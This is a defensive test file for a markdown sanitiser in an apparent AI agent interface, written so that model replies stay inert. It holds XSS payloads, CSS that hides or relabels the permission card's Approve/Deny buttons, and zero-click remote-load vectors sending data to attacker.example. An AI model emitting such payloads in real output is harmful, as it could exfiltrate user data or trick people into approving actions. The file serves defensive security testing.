// @vitest-environment jsdom
/// <reference types="vite/client" />
import { describe, expect, it } from "vitest";
import css from "./index.css?raw";
import { MARKDOWN_CACHE_LIMIT, markdownParseCount, renderMarkdown } from "./markdown";

describe("renderMarkdown", () => {
  it("highlights a fenced block in a language it knows", () => {
    const html = renderMarkdown("```rust\nfn main() {}\n```");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("main");
  });

  it("leaves an unknown language as plain monospace rather than guessing", () => {
    const html = renderMarkdown("```brainfuck\n+++++\n```");
    expect(html).not.toContain("hljs-keyword");
    expect(html).toContain("+++++");
  });

  it("still sanitizes, and sanitizes the highlighted HTML", () => {
    const html = renderMarkdown("<img src=x onerror=alert(1)>\n\n```rust\nfn main() {}\n```");
    expect(html).not.toContain("onerror");
    expect(html).toContain("hljs-keyword");
  });

  it("sanitizes AFTER markdown parsing, not before -- a URL only dangerous once rendered as an anchor", () => {
    // "[x](javascript:alert(1))" is inert as SOURCE TEXT -- there is no HTML in it yet for
    // DOMPurify to act on. marked turns it into `<a href="javascript:alert(1)">x</a>`, which is
    // dangerous. `DOMPurify.sanitize(marked.parse(text))` (the real order) strips the href
    // entirely; `marked.parse(DOMPurify.sanitize(text))` (parse-then-sanitize swapped, i.e.
    // sanitize-then-parse) sanitizes the harmless source string and hands its output straight to
    // marked with no sanitize afterwards, so the dangerous href survives untouched.
    //
    // Confirmed by mutating `renderMarkdown` to that swapped order: this assertion fails
    // (`href="javascript:alert(1)"` comes through) while the three tests above still pass -- this
    // is the one test in this file that pins the ORDER, not just that sanitizing happens at all.
    const html = renderMarkdown("[x](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("wraps a table in its own sideways scroller (T1)", () => {
    const html = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |");
    expect(html).toMatch(/<div class="table-scroll"><table>[\s\S]*<\/table><\/div>/);
  });

  it("parses a text once and serves the rest from a bounded cache (V3)", () => {
    const before = markdownParseCount();
    const a = renderMarkdown("once **only**");
    expect(renderMarkdown("once **only**")).toBe(a);
    expect(markdownParseCount() - before).toBe(1);
    for (let i = 0; i < MARKDOWN_CACHE_LIMIT + 5; i++) renderMarkdown(`filler ${i}`);
    const again = markdownParseCount();
    renderMarkdown("once **only**");
    expect(markdownParseCount() - again, "the oldest entry was evicted").toBe(1);
  });
});

// v1-hardening Task 1: R1 -- rendered model content is untrusted. These reproduce the probes from
// docs/superpowers/reviews/2026-09-27-v1-hardening/codex-sec-panel-content-verdicts.md findings
// 1 (adjacent probe), 2 and 3, which were verified REAL and blocking against the base commit.
describe("renderMarkdown keeps model content inert (panel-content findings 1-3)", () => {
  it("strips id/name/role/aria/data-*, and keeps class to what this module itself emits (finding 1 adjacent)", () => {
    const fakeCard =
      '<div class="row row-permission row-current" data-sign="!" aria-current="true" role="button" id="x">' +
      "fake card</div>";
    const fakeButton = '<button data-nav-action="allow" data-nav-order="1">Approve</button>';
    const fakePath = '<div data-hint-composer="1" data-path="/etc/passwd" data-tool-use-id="toolu_x">y</div>';
    const html = renderMarkdown([fakeCard, "", fakeButton, "", fakePath].join("\n"));
    expect(html).not.toContain("row-current");
    expect(html).not.toContain("row-permission");
    expect(html).not.toContain("data-sign");
    expect(html).not.toContain("aria-current");
    expect(html).not.toContain("role=");
    expect(html).not.toContain('id="x"');
    expect(html).not.toContain("data-nav-action");
    expect(html).not.toContain("data-nav-order");
    expect(html).not.toContain("data-hint-composer");
    expect(html).not.toContain("data-path");
    expect(html).not.toContain("data-tool-use-id");
  });

  it('drops an injected data-nav-stop="row" that would shift which card a key answers (finding 1)', () => {
    const injected = '<div data-nav-stop="row" hidden></div><div data-nav-stop="row" hidden></div>';
    const html = renderMarkdown(`x\n\n${injected}\n`);
    expect(html).not.toContain("data-nav-stop");
  });

  it("forbids a <style> tag and an inline style= attribute in every shape that survived before (finding 2)", () => {
    for (const src of [
      "<style>.x{color:red}</style>",
      "text\n\n<style>.x{color:red}</style>",
      "<div><style>.x{color:red}</style></div>",
      '<div style="position:fixed;inset:0;z-index:99;background:red;pointer-events:none">overlay</div>',
      '<div style="background:url(https://attacker.example/css-attr?s=C)">x</div>',
    ]) {
      const html = renderMarkdown(src);
      expect(html, src).not.toContain("<style");
      expect(html, src).not.toContain("style=");
    }
  });

  it("a reply's <style> cannot reach the real permission card's classes to hide or relabel it (finding 2)", () => {
    const attack = [
      "Here is the plan.",
      "",
      "<div><style>",
      ".permission-card .permission-card-command{display:none!important}",
      '.permission-card .permission-card-tool::after{content:"$ echo hello > note.txt"}',
      '.permission-card-buttons button[data-nav-action="deny"]{display:none!important}',
      '.permission-card-buttons button[data-nav-action="allow"]{font-size:0!important}',
      '.permission-card-buttons button[data-nav-action="allow"]::after{content:"Deny";font-size:14px}',
      "</style></div>",
      "",
    ].join("\n");
    const html = renderMarkdown(attack);
    expect(html).not.toContain("<style");
    expect(html).not.toContain("permission-card");
    expect(html).not.toContain("data-nav-action");
  });

  it("drops every zero-click remote-load vector finding 3 reproduced, with no attacker URL surviving", () => {
    const vectors = [
      '<img src="https://attacker.example/i2?s=A" width="0" height="0">',
      '<img srcset="https://attacker.example/srcset?s=B 1x">',
      '<div style="background:url(https://attacker.example/css-attr?s=C)">x</div>',
      "text\n\n<style>@import url(https://attacker.example/import?s=D);" +
        ".x{background:url(https://attacker.example/css-rule?s=E)}</style>",
      '<video poster="https://attacker.example/poster?s=F"></video>',
      '<audio src="https://attacker.example/audio?s=G" preload="auto"></audio>',
      '<picture><source srcset="https://attacker.example/source?s=H"><img src="x.png"></picture>',
      '<input type="image" src="https://attacker.example/input?s=J">',
      '<object data="https://attacker.example/obj?s=K"></object>',
      '<iframe src="https://attacker.example/frame?s=L"></iframe>',
      '<svg><image href="https://attacker.example/svgimg?s=M"></svg>',
    ];
    for (const src of vectors) {
      const html = renderMarkdown(src);
      expect(html, src).not.toContain("attacker.example");
    }
  });

  it("a markdown image renders as a link with the alt text and URL, never an auto-loading <img> (finding 3)", () => {
    const html = renderMarkdown("![diagram](https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT)");
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT"');
    expect(html).toContain("https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT");
    expect(html).toContain("diagram");
  });

  it("code blocks keep their highlight classes -- the allowlist does not eat legitimate output", () => {
    const html = renderMarkdown("```rust\nfn main() {}\n```");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain('class="code-block"');
  });

  it("a table keeps its scroll wrapper class -- the allowlist does not eat legitimate output", () => {
    const html = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |");
    expect(html).toContain('class="table-scroll"');
  });
});

// v1-hardening Task 1, fix round 1: a review of the finding-1-3 fixes above found five further
// defects in them (a legacy `background=` remote-load vector FORBID_ATTR missed, GFM checkboxes
// silently lost, an image's alt text double-escaped, a badge-style `[![img](url)](url)` losing its
// real link, and the class allowlist eating highlight.js's own `class_`/`function_` modifiers).
describe("renderMarkdown, fix round 1 (a review of findings 1-3's own fix)", () => {
  it("drops a legacy background= attribute -- WebKitGTK loads it as a background-image with no click", () => {
    const vectors = [
      '<table background="https://attacker.example/tbg"><tr><td>x</td></tr></table>',
      'x\n\n<table><tr><td background="https://attacker.example/tdbg">x</td></tr></table>',
    ];
    for (const src of vectors) {
      const html = renderMarkdown(src);
      expect(html, src).not.toContain("attacker.example");
      expect(html, src).not.toContain("background");
    }
  });

  it("forbids the MathML namespace -- the same zero-click shape as the svg <image href> vector", () => {
    const html = renderMarkdown('<math><mglyph src="https://attacker.example/mglyph"></mglyph></math>');
    expect(html).not.toContain("attacker.example");
    expect(html).not.toContain("<math");
  });

  it("keeps a GFM task list's done/not-done distinction instead of silently dropping both to the same <li>", () => {
    const html = renderMarkdown("- [ ] todo\n- [x] done");
    expect(html).not.toContain("<input");
    expect(html).toContain("[ ] todo");
    expect(html).toContain("[x] done");
  });

  it("does not double-escape an image's alt text (marked already escapes it before this module sees it)", () => {
    const html = renderMarkdown("![a & b <c>](https://example.com/x)");
    // The single escaping marked itself applies is expected and fine; a SECOND layer
    // (`&amp;amp;`/`&amp;lt;`) is the bug -- it renders literally on screen, not decoded.
    expect(html).not.toContain("&amp;amp;");
    expect(html).not.toContain("&amp;lt;");
    expect(html).not.toContain("&amp;gt;");
    expect(html).toContain("a &amp; b &lt;c&gt;");
  });

  it("a badge link (`[![badge](img-url)](real-url)`) keeps its real, clickable outer link", () => {
    const html = renderMarkdown("[![badge](https://img.example/b.svg)](https://proj.example/)");
    const div = document.createElement("div");
    div.innerHTML = html;
    const anchors = div.querySelectorAll("a");
    // Exactly one anchor: the badge's own <a> must not survive as a second, sibling anchor that
    // steals the visible/clickable area from the real link (reproduced: two anchors, the first
    // -- the real one -- empty and invisible, the second pointing at the badge image instead).
    expect(anchors.length).toBe(1);
    expect(anchors[0].getAttribute("href")).toBe("https://proj.example/");
    expect(anchors[0].textContent).toContain("badge");
  });

  it("a plain (non-badge) markdown image is still its own clickable link, unaffected by the badge fix", () => {
    const html = renderMarkdown("![diagram](https://example.com/pixel.png)");
    const div = document.createElement("div");
    div.innerHTML = html;
    const a = div.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com/pixel.png");
    expect(a.textContent).toContain("diagram");
  });

  it("an ordinary (non-badge) link is unaffected by the badge-collapsing fallback", () => {
    const html = renderMarkdown("[some text](https://example.com/page)");
    const div = document.createElement("div");
    div.innerHTML = html;
    const a = div.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com/page");
    expect(a.textContent).toBe("some text");
  });

  it("keeps highlight.js's own class_/function_ modifiers, which index.css targets with a compound selector", () => {
    const html = renderMarkdown("```rust\nstruct Point { x: i32 }\n```");
    expect(html).toContain('class="hljs-title class_"');
  });
});

function parse(html: string): HTMLDivElement {
  const div = document.createElement("div");
  div.innerHTML = html;
  return div;
}

// v1-hardening Task 1, fix round 2: a re-review of fix round 1 found an overlay the sanitizer still
// let through (`<dialog open>`, positioned by the UA stylesheet with no `style` at all), image
// links resolving HTML entities differently from ordinary links, the badge fix covering only a
// link whose whole content is one image, and a comment claiming a test that does not exist.
describe("renderMarkdown, fix round 2 (a re-review of fix round 1)", () => {
  it("drops <dialog>: the UA stylesheet positions an open one absolutely, an overlay with no style=", () => {
    // WebKitGTK's own UA sheet: `dialog { position: absolute; inset-inline: 0; margin: auto;
    // background-color: Canvas; ... } dialog[open] { display: block; }`. `.row`/`.message-list`
    // are not positioned, so it lays out against `.agent-ui-scroller` and paints over the rows
    // after it -- the real permission card included (finding 2's overlay, rebuilt without style).
    const html = renderMarkdown("x\n\n<dialog open><p>Bash: ls</p><button>Approve</button></dialog>");
    const div = parse(html);
    expect(div.querySelector("dialog"), html).toBeNull();
    expect(html).not.toContain("<dialog");
    // Its content stays, in flow, as part of the reply that wrote it.
    expect(div.textContent).toContain("Bash: ls");
  });

  it("drops popover/popovertarget/commandfor/command/tabindex -- no reply opens, invokes or takes focus", () => {
    const vectors = [
      '<div popover="manual">p</div>',
      '<button popovertarget="panel-owned" popovertargetaction="show">b</button>',
      '<button commandfor="panel-owned" command="show-modal">c</button>',
      '<span tabindex="0">t</span>',
    ];
    for (const src of vectors) {
      const html = renderMarkdown(src);
      for (const attr of ["popover", "popovertarget", "popovertargetaction", "commandfor", "command", "tabindex"]) {
        expect(html, src).not.toMatch(new RegExp(`\\s${attr}=`));
      }
    }
  });

  it("an image link resolves entities exactly as an ordinary link to the same destination does", () => {
    // CommonMark: entity references are decoded in link destinations, so `&amp;` in the source is
    // `&` in the URL. marked's own link renderer gets that by emitting the (encodeURI-cleaned)
    // destination raw into the attribute; the image branches used to escape it a second time,
    // renaming the query parameter `b` to `amp;b`.
    const destinations = [
      "https://x.example/?a=1&amp;b=2",
      "https://x.example/?a=1&b=2",
      "https://x.example/?q=&copy=1",
      "https://x.example/ü/a.png",
      "<https://x.example/a b.png>",
    ];
    for (const dest of destinations) {
      const ordinary = parse(renderMarkdown(`[t](${dest})`)).querySelector("a")!.getAttribute("href");
      expect(ordinary, dest).not.toBeNull();
      const image = parse(renderMarkdown(`![d](${dest})`)).querySelector("a")!;
      expect(image.getAttribute("href"), dest).toBe(ordinary);
      // R1: the link shows the full URL -- the SAME string it goes to, not a differently-decoded one.
      expect(image.textContent, dest).toBe(`d: ${ordinary}`);
      const badge = parse(renderMarkdown(`[![b](https://i.example/i.svg)](${dest})`)).querySelectorAll("a");
      expect(badge.length, dest).toBe(1);
      expect(badge[0].getAttribute("href"), dest).toBe(ordinary);
    }
    expect(parse(renderMarkdown("[t](https://x.example/?a=1&amp;b=2)")).querySelector("a")!.getAttribute("href"))
      .toBe("https://x.example/?a=1&b=2");
  });

  it("an image anywhere inside a link's text is part of that ONE link, never a second anchor to the image", () => {
    const sources = [
      "[see ![b](https://i.example/x.svg)](https://proj.example/)",
      "[see *em ![b](https://i.example/x.svg)*](https://proj.example/)",
      "[![a](https://i.example/a.svg) and ![b](https://i.example/b.svg)](https://proj.example/)",
    ];
    for (const src of sources) {
      const anchors = parse(renderMarkdown(src)).querySelectorAll("a");
      expect(anchors.length, src).toBe(1);
      expect(anchors[0].getAttribute("href"), src).toBe("https://proj.example/");
      expect(anchors[0].textContent, src).toContain("b");
    }
    // An image with no alt text inside a link still says what it was, as before (fix round 1).
    const bare = parse(renderMarkdown("[![](https://i.example/x.svg)](https://proj.example/)")).querySelectorAll("a");
    expect(bare.length).toBe(1);
    expect(bare[0].textContent).toBe("https://i.example/x.svg");
  });

  it("every modifier class index.css compounds onto an hljs-* selector survives sanitizing", () => {
    // highlightCoverage.test.ts deliberately ignores the bare modifiers (`class_`, `function_`, ...),
    // so it cannot notice the sanitizer stripping one. This is the check: a rule for a new
    // modifier added to index.css without adding it to markdown.ts's allowlist fails here.
    const compounds = [...css.matchAll(/\.(hljs-[\w-]+)((?:\.[\w-]+)+)/g)].map((m) => [
      m[1],
      ...m[2].slice(1).split("."),
    ]);
    expect(compounds.length).toBeGreaterThanOrEqual(2);
    for (const classes of compounds) {
      const html = renderMarkdown(`<span class="${classes.join(" ")}">x</span>`);
      const span = parse(html).querySelector("span");
      expect(span, classes.join(".")).not.toBeNull();
      for (const cls of classes) expect(span!.classList.contains(cls), `${classes.join(".")}: ${cls}`).toBe(true);
    }
    // And the real highlighter's `function_` (the Rust `class_` case is the fix-round-1 test above).
    expect(renderMarkdown("```javascript\nfunction add(a, b) { return a + b; }\n```")).toContain(
      'class="hljs-title function_"',
    );
  });
});
